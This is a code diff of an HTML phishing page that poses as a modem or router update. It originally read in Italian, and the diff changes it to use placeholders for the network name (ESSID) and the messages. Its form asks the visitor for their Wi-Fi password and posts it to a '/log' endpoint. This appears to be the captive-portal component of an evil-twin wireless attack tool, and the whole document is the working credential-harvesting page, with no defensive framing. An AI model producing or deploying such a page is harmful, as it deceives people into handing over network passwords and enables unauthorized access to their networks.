@@ -1,7 +1,7 @@
 <!DOCTYPE html>
-<html>
+<html lang="{lang}">
   <head>
-    <title>essid</title>
+    <title>{essid}</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
       body {
@@ -47,12 +47,12 @@
   </head>
   <body>
     <div class="update">
-      <h1>essid</h1>
-      <p>Il tuo modem &egrave; stato aggiornato! Inserisci la tua password di rete per completare l'operazione</p>
+      <h1>{essid}</h1>
+      <p>{info}</p>
       <form action="/log" method="POST">
         <input type="text" id="s" name="s" value="s" hidden>
-        <input type="password" id="pass" name="pass" placeholder="Password di rete" minlength="6" required>
-        <input type="submit" value="Conferma">
+        <input type="password" id="pass" name="pass" placeholder="{password}" minlength="6" required>
+        <input type="submit" value="{confirm}">
       </form>
     </div>
   </body>
